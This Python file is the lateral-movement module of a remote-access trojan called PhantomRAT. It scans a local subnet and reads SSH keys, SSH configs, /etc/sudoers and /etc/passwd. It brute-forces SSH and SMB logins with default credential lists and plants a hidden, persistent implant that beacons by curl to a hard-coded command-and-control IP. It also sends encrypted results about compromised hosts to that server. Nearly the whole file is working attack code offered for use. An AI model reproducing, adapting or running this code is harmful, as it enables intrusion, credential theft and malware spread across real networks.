#!/usr/bin/env python3
"""
PhantomRAT Lateral Movement Module v4.0
Advanced SSH/SMB/WinRM exploitation with credential harvesting and propagation.
Enhanced for C2 v4.0 dashboard integration.
"""

import os
import sys
import json
import time
import socket
import subprocess
import threading
import paramiko
import hashlib
import base64
import uuid
import ipaddress
import concurrent.futures
from datetime import datetime
from pathlib import Path

# Try to import required libraries
try:
    import requests
    import psutil
    from cryptography.fernet import Fernet
    import nmap
    NMAP_AVAILABLE = True
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[*] Install with: pip install paramiko requests psutil python-nmap cryptography")
    NMAP_AVAILABLE = False
    sys.exit(1)

# ==================== CONFIGURATION ====================
C2_SERVER = "http://141.105.71.196:8000"  # Your C2 IP
SESSION_ID = str(uuid.uuid4())[:8]

# Load profile if available
try:
    with open('malleable_profile.json', 'r') as f:
        PROFILE = json.load(f)
        USER_AGENT = PROFILE.get('security', {}).get('user_agent', 
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
except:
    USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

# ==================== ENCRYPTION ====================
class PhantomEncryption:
    """Encryption handler for C2 communication"""
    
    def __init__(self, key=None):
        if key is None:
            # Generate key from system info
            system_hash = hashlib.sha256(
                f"{socket.gethostname()}{os.getpid()}{time.time()}".encode()
            ).digest()[:32]
            key = system_hash
        
        if isinstance(key, str):
            key = key.encode()
        
        # Ensure 32 bytes
        if len(key) < 32:
            key = key.ljust(32, b'0')[:32]
        
        fernet_key = base64.urlsafe_b64encode(key)
        self.fernet = Fernet(fernet_key)
    
    def encrypt(self, data):
        """Encrypt data for C2 transmission"""
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':'))
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        try:
            return self.fernet.encrypt(data).decode('utf-8')
        except:
            return base64.b64encode(data).decode('utf-8')
    
    def decrypt(self, encrypted_data):
        """Decrypt data from C2"""
        try:
            if isinstance(encrypted_data, str):
                encrypted_data = encrypted_data.encode('utf-8')
            
            decrypted = self.fernet.decrypt(encrypted_data).decode('utf-8')
            try:
                return json.loads(decrypted)
            except:
                return decrypted
        except:
            try:
                return base64.b64decode(encrypted_data).decode('utf-8')
            except:
                return None

# Initialize encryption
encryption = PhantomEncryption()

# ==================== NETWORK DISCOVERY ====================
class NetworkScanner:
    """Advanced network scanner for lateral movement"""
    
    def __init__(self):
        self.discovered_hosts = []
        self.open_ports = {}
        self.operating_systems = {}
        
    def get_local_network(self):
        """Get local network information"""
        try:
            # Get local IP and subnet
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Assume /24 subnet
            subnet_base = '.'.join(local_ip.split('.')[:3])
            return f"{subnet_base}.0/24"
        except:
            return "192.168.1.0/24"
    
    def arp_scan(self, subnet=None):
        """Perform ARP scan for active hosts"""
        if subnet is None:
            subnet = self.get_local_network()
        
        print(f"[*] ARP scanning subnet: {subnet}")
        active_hosts = []
        
        try:
            # Simple ping sweep
            network = ipaddress.ip_network(subnet, strict=False)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                for ip in list(network.hosts())[:254]:  # Limit to 254 hosts
                    futures.append(executor.submit(self.ping_host, str(ip)))
                
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result['alive']:
                        active_hosts.append(result)
        
        except Exception as e:
            print(f"[!] ARP scan error: {e}")
        
        self.discovered_hosts = active_hosts
        return active_hosts
    
    def ping_host(self, ip, timeout=1):
        """Ping a single host"""
        try:
            # Platform-specific ping command
            param = '-n' if sys.platform.lower() == 'win32' else '-c'
            command = ['ping', param, '1', '-W', str(timeout), ip]
            
            result = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout + 1
            )
            
            return {
                'ip': ip,
                'alive': result.returncode == 0,
                'hostname': socket.getfqdn(ip) if result.returncode == 0 else None
            }
        except:
            return {'ip': ip, 'alive': False}
    
    def port_scan(self, ip, ports=None):
        """Scan ports on a host"""
        if ports is None:
            ports = [22, 445, 3389, 5985, 5986]  # SSH, SMB, RDP, WinRM
        
        open_ports = []
        
        try:
            for port in ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service = self.get_service_name(port)
                    open_ports.append({
                        'port': port,
                        'service': service,
                        'protocol': 'tcp'
                    })
        
        except Exception as e:
            print(f"[!] Port scan error for {ip}: {e}")
        
        self.open_ports[ip] = open_ports
        return open_ports
    
    def get_service_name(self, port):
        """Get service name from port number"""
        service_map = {
            22: 'SSH',
            23: 'Telnet',
            80: 'HTTP',
            443: 'HTTPS',
            445: 'SMB',
            139: 'NetBIOS',
            135: 'MSRPC',
            3389: 'RDP',
            5985: 'WinRM',
            5986: 'WinRM SSL',
            21: 'FTP',
            25: 'SMTP',
            110: 'POP3',
            143: 'IMAP',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            27017: 'MongoDB'
        }
        return service_map.get(port, f'Unknown ({port})')
    
    def advanced_nmap_scan(self, ip):
        """Perform advanced scan if nmap is available"""
        if not NMAP_AVAILABLE:
            return None
        
        try:
            nm = nmap.PortScanner()
            nm.scan(ip, arguments='-sV -O --script=banner')
            
            scan_info = {
                'ip': ip,
                'hostnames': nm[ip].hostnames() if ip in nm else [],
                'os_info': nm[ip]['osmatch'] if ip in nm and 'osmatch' in nm[ip] else [],
                'ports': []
            }
            
            if ip in nm:
                for proto in nm[ip].all_protocols():
                    for port in nm[ip][proto]:
                        port_info = nm[ip][proto][port]
                        scan_info['ports'].append({
                            'port': port,
                            'state': port_info['state'],
                            'service': port_info.get('name', 'unknown'),
                            'version': port_info.get('version', 'unknown'),
                            'product': port_info.get('product', 'unknown')
                        })
            
            return scan_info
        except Exception as e:
            print(f"[!] Nmap scan error: {e}")
            return None

# ==================== CREDENTIAL HARVESTING ====================
class CredentialHarvester:
    """Harvest credentials from local system"""
    
    def __init__(self):
        self.credentials = {
            'ssh_keys': [],
            'ssh_configs': [],
            'browser_creds': [],
            'system_creds': []
        }
    
    def harvest_ssh_keys(self):
        """Harvest SSH keys from common locations"""
        ssh_keys = []
        ssh_dirs = [
            Path.home() / '.ssh',
            Path('/etc/ssh'),
            Path('/root/.ssh')
        ]
        
        for ssh_dir in ssh_dirs:
            if ssh_dir.exists():
                for key_file in ssh_dir.glob('*'):
                    if key_file.suffix in ['.pub', ''] and key_file.is_file():
                        try:
                            with open(key_file, 'r') as f:
                                content = f.read()
                                if 'PRIVATE KEY' in content or 'PUBLIC KEY' in content:
                                    ssh_keys.append({
                                        'path': str(key_file),
                                        'content_preview': content[:200],
                                        'size': len(content)
                                    })
                        except:
                            pass
        
        self.credentials['ssh_keys'] = ssh_keys
        return ssh_keys
    
    def harvest_ssh_configs(self):
        """Harvest SSH configuration files"""
        configs = []
        config_files = [
            Path.home() / '.ssh/config',
            Path('/etc/ssh/ssh_config'),
            Path('/etc/ssh/sshd_config')
        ]
        
        for config_file in config_files:
            if config_file.exists():
                try:
                    with open(config_file, 'r') as f:
                        content = f.read()
                        configs.append({
                            'path': str(config_file),
                            'content': content,
                            'hosts': self.extract_ssh_hosts(content)
                        })
                except:
                    pass
        
        self.credentials['ssh_configs'] = configs
        return configs
    
    def extract_ssh_hosts(self, config_content):
        """Extract SSH hosts from config"""
        hosts = []
        lines = config_content.split('\n')
        
        for line in lines:
            line = line.strip()
            if line.startswith('Host ') and not line.startswith('Host *'):
                hosts.extend(line[5:].split())
        
        return hosts
    
    def harvest_system_credentials(self):
        """Harvest system credentials based on platform"""
        creds = []
        
        if sys.platform == 'win32':
            # Windows credential harvesting
            try:
                # Try to extract from Credential Manager
                import win32cred
                import win32security
                
                creds = self.harvest_windows_creds()
            except ImportError:
                print(f"[!] pywin32 not available for Windows credential harvesting")
        
        elif sys.platform in ['linux', 'darwin']:
            # Linux/macOS credential harvesting
            creds = self.harvest_unix_creds()
        
        self.credentials['system_creds'] = creds
        return creds
    
    def harvest_windows_creds(self):
        """Harvest Windows credentials"""
        # This would require pywin32 and is OS-specific
        # Simplified version for demonstration
        return [{'type': 'windows', 'info': 'Credential harvesting requires pywin32'}]
    
    def harvest_unix_creds(self):
        """Harvest Unix credentials"""
        creds = []
        
        # Check for sudoers file
        sudoers_path = Path('/etc/sudoers')
        if sudoers_path.exists():
            try:
                with open(sudoers_path, 'r') as f:
                    content = f.read()
                    creds.append({
                        'type': 'sudoers',
                        'file': str(sudoers_path),
                        'content': content
                    })
            except:
                pass
        
        # Check for password files
        passwd_path = Path('/etc/passwd')
        if passwd_path.exists():
            try:
                with open(passwd_path, 'r') as f:
                    users = []
                    for line in f:
                        if ':/' in line:
                            users.append(line.split(':')[0])
                    creds.append({
                        'type': 'passwd',
                        'file': str(passwd_path),
                        'users': users[:20]  # First 20 users
                    })
            except:
                pass
        
        return creds

# ==================== BRUTE FORCE ATTACKS ====================
class BruteForceEngine:
    """Multi-protocol brute force engine"""
    
    def __init__(self):
        self.credentials_found = []
        self.common_users = [
            'root', 'admin', 'administrator', 'user', 'test',
            'ubuntu', 'centos', 'debian', 'oracle', 'postgres',
            'git', 'www-data', 'nginx', 'apache', 'mysql'
        ]
        
        self.common_passwords = [
            'password', '123456', 'admin', 'root', 'test',
            'password123', 'admin123', 'root123', 'qwerty',
            'letmein', 'welcome', 'monkey', '123456789',
            '12345678', '12345', '1234', '123', 'abc123'
        ]
    
    def brute_ssh(self, ip, username=None, password=None, port=22):
        """Brute force SSH service"""
        print(f"[*] Attempting SSH brute force on {ip}:{port}")
        
        # Use provided creds or defaults
        users = [username] if username else self.common_users
        passwords = [password] if password else self.common_passwords
        
        for user in users:
            for pwd in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Quick timeout for brute force
                    ssh.connect(
                        ip,
                        port=port,
                        username=user,
                        password=pwd,
                        timeout=5,
                        banner_timeout=5,
                        auth_timeout=5
                    )
                    
                    # Success! Test command execution
                    stdin, stdout, stderr = ssh.exec_command('whoami', timeout=5)
                    output = stdout.read().decode().strip()
                    
                    credential = {
                        'ip': ip,
                        'port': port,
                        'service': 'SSH',
                        'username': user,
                        'password': pwd,
                        'access_level': output,
                        'timestamp': time.time()
                    }
                    
                    self.credentials_found.append(credential)
                    
                    # Try to deploy implant
                    self.deploy_implant_ssh(ssh, ip, user)
                    
                    ssh.close()
                    return credential
                    
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    # Connection error, move on
                    continue
        
        return None
    
    def deploy_implant_ssh(self, ssh_connection, ip, username):
        """Deploy PhantomRAT implant via SSH"""
        print(f"[*] Attempting to deploy implant on {ip} as {username}")
        
        try:
            # Check system info
            stdin, stdout, stderr = ssh_connection.exec_command('uname -a', timeout=5)
            system_info = stdout.read().decode().strip()
            
            # Create implant directory
            ssh_connection.exec_command('mkdir -p /tmp/.phantom 2>/dev/null', timeout=5)
            
            # Upload implant (simplified - in reality would transfer files)
            implant_command = f"""
            echo "#!/bin/bash" > /tmp/.phantom/implant.sh
            echo "while true; do" >> /tmp/.phantom/implant.sh
            echo "    curl -s {C2_SERVER}/phantom/beacon >> /tmp/.phantom/log" >> /tmp/.phantom/implant.sh
            echo "    sleep 30" >> /tmp/.phantom/implant.sh
            echo "done" >> /tmp/.phantom/implant.sh
            chmod +x /tmp/.phantom/implant.sh
            nohup /tmp/.phantom/implant.sh >/dev/null 2>&1 &
            """
            
            stdin, stdout, stderr = ssh_connection.exec_command(implant_command, timeout=10)
            print(f"[+] Implant deployment attempted on {ip}")
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to deploy implant on {ip}: {e}")
            return False
    
    def brute_smb(self, ip, username=None, password=None):
        """Brute force SMB service"""
        print(f"[*] Attempting SMB brute force on {ip}")
        
        if sys.platform != 'win32':
            print(f"[!] SMB brute force requires Windows or impacket")
            return None
        
        # Windows SMB brute force
        users = [username] if username else self.common_users
        passwords = [password] if password else self.common_passwords
        
        for user in users:
            for pwd in passwords:
                try:
                    # Using net use command (Windows)
                    command = f'net use \\\\{ip}\\IPC$ {pwd} /user:{user} 2>&1'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    
                    if 'successfully' in result.stdout.lower():
                        credential = {
                            'ip': ip,
                            'service': 'SMB',
                            'username': user,
                            'password': pwd,
                            'timestamp': time.time()
                        }
                        
                        self.credentials_found.append(credential)
                        print(f"[+] SMB credentials found: {user}:{pwd} on {ip}")
                        
                        # Try to deploy via SMB
                        self.deploy_implant_smb(ip, user, pwd)
                        
                        return credential
                        
                except Exception as e:
                    continue
        
        return None
    
    def deploy_implant_smb(self, ip, username, password):
        """Deploy implant via SMB share"""
        print(f"[*] Attempting SMB implant deployment on {ip}")
        
        try:
            # Mount share
            mount_cmd = f"net use Z: \\\\{ip}\\C$ {password} /user:{username}"
            subprocess.run(mount_cmd, shell=True, capture_output=True)
            
            # Copy implant (simplified)
            # In reality, would copy actual implant files
            
            print(f"[+] SMB access achieved on {ip}")
            return True
            
        except Exception as e:
            print(f"[!] SMB deployment failed: {e}")
            return False
    
    def test_winrm(self, ip, username, password):
        """Test WinRM access"""
        if sys.platform != 'win32':
            return False
        
        try:
            command = f'powershell -Command "$cred = New-Object System.Management.Automation.PSCredential(\'{username}\', (ConvertTo-SecureString \'{password}\' -AsPlainText -Force)); Invoke-Command -ComputerName {ip} -Credential $cred -ScriptBlock {{hostname}}"'
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            
            return result.returncode == 0
        except:
            return False

# ==================== LATERAL MOVEMENT ORCHESTRATOR ====================
class LateralMovementOrchestrator:
    """Main orchestrator for lateral movement attacks"""
    
    def __init__(self):
        self.scanner = NetworkScanner()
        self.harvester = CredentialHarvester()
        self.brute_forcer = BruteForceEngine()
        self.compromised_hosts = []
        
    def discover_network(self):
        """Discover network and identify targets"""
        print(f"[*] Starting network discovery...")
        
        # ARP scan for active hosts
        active_hosts = self.scanner.arp_scan()
        print(f"[+] Found {len(active_hosts)} active hosts")
        
        # Port scan interesting hosts
        for host in active_hosts[:10]:  # Limit to first 10 hosts
            if host['alive']:
                print(f"[*] Scanning ports on {host['ip']}...")
                open_ports = self.scanner.port_scan(host['ip'])
                
                if open_ports:
                    print(f"[+] {host['ip']} has open ports: {[p['port'] for p in open_ports]}")
                    
                    # Check for lateral movement opportunities
                    lateral_ports = [22, 445, 3389, 5985, 5986]
                    if any(p['port'] in lateral_ports for p in open_ports):
                        host['lateral_possible'] = True
                        host['open_ports'] = open_ports
        
        return [h for h in active_hosts if h.get('lateral_possible', False)]
    
    def harvest_local_credentials(self):
        """Harvest credentials from local system"""
        print(f"[*] Harvesting local credentials...")
        
        ssh_keys = self.harvester.harvest_ssh_keys()
        ssh_configs = self.harvester.harvest_ssh_configs()
        system_creds = self.harvester.harvest_system_credentials()
        
        print(f"[+] Found {len(ssh_keys)} SSH keys")
        print(f"[+] Found {len(ssh_configs)} SSH configs")
        print(f"[+] Harvested system credentials")
        
        return {
            'ssh_keys': ssh_keys,
            'ssh_configs': ssh_configs,
            'system_creds': system_creds
        }
    
    def execute_lateral_attack(self, target_ip, credentials=None):
        """Execute lateral movement attack on target"""
        print(f"[*] Attempting lateral movement to {target_ip}")
        
        results = {
            'target': target_ip,
            'success': False,
            'method': None,
            'credentials': None,
            'implant_deployed': False,
            'timestamp': time.time()
        }
        
        # First, try SSH if port 22 is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            ssh_open = sock.connect_ex((target_ip, 22)) == 0
            sock.close()
            
            if ssh_open:
                print(f"[*] SSH port open on {target_ip}, attempting brute force...")
                
                # Try harvested credentials first
                if credentials and 'ssh_keys' in credentials:
                    # Try key-based authentication
                    pass  # Implement key auth
                
                # Try brute force
                ssh_creds = self.brute_forcer.brute_ssh(target_ip)
                
                if ssh_creds:
                    results['success'] = True
                    results['method'] = 'SSH'
                    results['credentials'] = ssh_creds
                    results['implant_deployed'] = True
                    self.compromised_hosts.append(results)
                    return results
        except:
            pass
        
        # Try SMB if port 445 is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            smb_open = sock.connect_ex((target_ip, 445)) == 0
            sock.close()
            
            if smb_open:
                print(f"[*] SMB port open on {target_ip}, attempting access...")
                
                smb_creds = self.brute_forcer.brute_smb(target_ip)
                
                if smb_creds:
                    results['success'] = True
                    results['method'] = 'SMB'
                    results['credentials'] = smb_creds
                    results['implant_deployed'] = True
                    self.compromised_hosts.append(results)
                    return results
        except:
            pass
        
        print(f"[-] Failed lateral movement to {target_ip}")
        return results
    
    def automated_lateral_campaign(self, max_targets=5):
        """Run automated lateral movement campaign"""
        print(f"[*] Starting automated lateral movement campaign")
        print(f"[*] Maximum targets: {max_targets}")
        print("-" * 50)
        
        # Step 1: Network discovery
        print(f"\n[PHASE 1] Network Discovery")
        lateral_targets = self.discover_network()
        
        if not lateral_targets:
            print(f"[-] No suitable lateral movement targets found")
            return []
        
        print(f"[+] Found {len(lateral_targets)} potential lateral movement targets")
        
        # Step 2: Credential harvesting
        print(f"\n[PHASE 2] Credential Harvesting")
        harvested_creds = self.harvest_local_credentials()
        
        # Step 3: Lateral movement attempts
        print(f"\n[PHASE 3] Lateral Movement Execution")
        compromised_hosts = []
        
        for i, target in enumerate(lateral_targets[:max_targets]):
            print(f"\n[*] Target {i+1}/{len(lateral_targets[:max_targets])}: {target['ip']}")
            
            result = self.execute_lateral_attack(target['ip'], harvested_creds)
            
            if result['success']:
                print(f"[+] Successfully compromised {target['ip']} via {result['method']}")
                compromised_hosts.append(result)
                
                # Brief pause between attacks
                time.sleep(random.uniform(2, 5))
            else:
                print(f"[-] Failed to compromise {target['ip']}")
        
        print(f"\n[+] Campaign complete: {len(compromised_hosts)}/{len(lateral_targets[:max_targets])} hosts compromised")
        return compromised_hosts

# ==================== C2 COMMUNICATION ====================
def send_to_c2(endpoint, data):
    """Send data to C2 server"""
    headers = {
        'User-Agent': USER_AGENT,
        'X-Phantom-Module': 'LateralMovement',
        'X-Phantom-Session': SESSION_ID,
        'X-Phantom-Version': '4.0'
    }
    
    try:
        encrypted_data = encryption.encrypt(data)
        
        response = requests.post(
            f"{C2_SERVER}{endpoint}",
            data=encrypted_data,
            headers=headers,
            timeout=30,
            verify=False
        )
        
        if response.status_code == 200:
            try:
                return encryption.decrypt(response.content)
            except:
                return {'status': 'received'}
        return {'error': f'HTTP {response.status_code}'}
    except Exception as e:
        print(f"[!] C2 communication error: {e}")
        return {'error': str(e)}

def exfil_lateral_results(results):
    """Exfiltrate lateral movement results to C2"""
    exfil_data = {
        'module': 'lateral_movement',
        'session_id': SESSION_ID,
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'timestamp': datetime.now().isoformat(),
        'results': results,
        'campaign_summary': {
            'total_targets': len(results),
            'successful_targets': len([r for r in results if r['success']]),
            'compromised_hosts': [r['target'] for r in results if r['success']],
            'methods_used': list(set([r['method'] for r in results if r['method']]))
        }
    }
    
    result = send_to_c2('/phantom/exfil', exfil_data)
    return result

# ==================== MAIN FUNCTION ====================
def perform_lateral_movement_campaign(max_targets=3, exfil_to_c2=True):
    """Main lateral movement function"""
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║         PHANTOM RAT LATERAL MOVEMENT           ║
    ║                   v4.0                          ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    print(f"[*] Session ID: {SESSION_ID}")
    print(f"[*] Source Host: {socket.gethostname()}")
    print(f"[*] Source IP: {socket.gethostbyname(socket.gethostname())}")
    print(f"[*] Max Targets: {max_targets}")
    print(f"[*] C2 Reporting: {exfil_to_c2}")
    print("-" * 50)
    
    # Initialize orchestrator
    orchestrator = LateralMovementOrchestrator()
    
    # Run automated campaign
    results = orchestrator.automated_lateral_campaign(max_targets)
    
    # Report to C2
    if exfil_to_c2 and results:
        print(f"\n[*] Reporting results to C2...")
        c2_result = exfil_lateral_results(results)
        
        if c2_result and 'error' not in c2_result:
            print(f"[+] Results successfully sent to C2")
        else:
            print(f"[-] Failed to send results to C2")
    
    # Summary
    print(f"\n[+] Campaign Summary:")
    print(f"    Targets Attempted: {len(results)}")
    print(f"    Successfully Compromised: {len([r for r in results if r['success']])}")
    
    if orchestrator.compromised_hosts:
        print(f"\n[+] Compromised Hosts:")
        for host in orchestrator.compromised_hosts:
            print(f"    • {host['target']} via {host['method']}")
    
    return results

# ==================== COMMAND LINE INTERFACE ====================
def main():
    """Command line interface"""
    import argparse
    import random
    
    parser = argparse.ArgumentParser(description='PhantomRAT Lateral Movement Module v4.0')
    parser.add_argument('--campaign', action='store_true', help='Run automated lateral movement campaign')
    parser.add_argument('--scan', action='store_true', help='Scan network only (no attacks)')
    parser.add_argument('--harvest', action='store_true', help='Harvest credentials only')
    parser.add_argument('--target', type=str, help='Attack specific target IP')
    parser.add_argument('--max-targets', type=int, default=3, help='Maximum targets for campaign')
    parser.add_argument('--test', action='store_true', help='Test mode (no actual attacks)')
    
    args = parser.parse_args()
    
    if args.test:
        print(f"[*] Running in TEST mode")
        # Test network scanner
        scanner = NetworkScanner()
        hosts = scanner.arp_scan()
        print(f"[*] Found {len(hosts)} active hosts")
        
        if hosts:
            print(f"[*] Sample hosts:")
            for host in hosts[:3]:
                print(f"    • {host['ip']} - Alive: {host['alive']}")
        
        # Test credential harvester
        harvester = CredentialHarvester()
        ssh_keys = harvester.harvest_ssh_keys()
        print(f"[*] Found {len(ssh_keys)} SSH keys")
        
        return
    
    if args.scan:
        scanner = NetworkScanner()
        hosts = scanner.discover_network()
        
        if hosts:
            print(f"\n[+] Lateral Movement Targets:")
            for host in hosts:
                print(f"\n    IP: {host['ip']}")
                if 'open_ports' in host:
                    print(f"    Open Ports: {[p['port'] for p in host['open_ports']]}")
        else:
            print(f"[-] No lateral movement targets found")
        
        return
    
    if args.harvest:
        harvester = CredentialHarvester()
        
        ssh_keys = harvester.harvest_ssh_keys()
        ssh_configs = harvester.harvest_ssh_configs()
        system_creds = harvester.harvest_system_credentials()
        
        print(f"\n[+] Credential Harvest Results:")
        print(f"    SSH Keys: {len(ssh_keys)}")
        print(f"    SSH Configs: {len(ssh_configs)}")
        print(f"    System Creds: {len(system_creds)}")
        
        if ssh_configs:
            print(f"\n[+] SSH Hosts from configs:")
            for config in ssh_configs:
                if config['hosts']:
                    print(f"    {config['path']}: {', '.join(config['hosts'])}")
        
        return
    
    if args.target:
        print(f"[*] Targeting specific IP: {args.target}")
        
        orchestrator = LateralMovementOrchestrator()
        
        # Scan target
        print(f"[*] Scanning target...")
        open_ports = orchestrator.scanner.port_scan(args.target)
        
        if open_ports:
            print(f"[+] Open ports on {args.target}: {[p['port'] for p in open_ports]}")
            
            # Attempt attack
            result = orchestrator.execute_lateral_attack(args.target)
            
            if result['success']:
                print(f"[+] Successfully compromised {args.target}")
                print(f"[+] Method: {result['method']}")
            else:
                print(f"[-] Failed to compromise {args.target}")
        else:
            print(f"[-] No open ports found on {args.target}")
        
        return
    
    if args.campaign:
        print(f"[*] Starting lateral movement campaign...")
        print(f"[*] WARNING: This will attempt to compromise other systems!")
        
        response = input(f"[?] Are you sure you want to continue? (yes/NO): ")
        
        if response.lower() == 'yes':
            results = perform_lateral_movement_campaign(args.max_targets)
            
            if results:
                print(f"\n[+] Campaign completed successfully")
            else:
                print(f"\n[-] Campaign failed or no targets compromised")
        else:
            print(f"[*] Operation cancelled")
    else:
        parser.print_help()

if __name__ == '__main__':
    import random
    main()
